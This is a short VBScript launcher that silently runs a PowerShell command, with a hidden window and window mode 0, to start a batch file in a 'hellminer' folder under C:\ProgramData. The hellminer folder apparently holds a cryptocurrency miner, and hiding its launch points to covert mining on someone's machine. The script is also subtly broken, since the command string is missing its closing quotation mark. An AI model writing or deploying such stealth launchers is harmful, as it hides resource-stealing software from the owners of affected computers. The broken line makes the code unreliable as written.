Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "powershell -windowstyle hidden C:\ProgramData\hellminer\run.bat start
objShell.Run command,0
Set objShell = Nothing
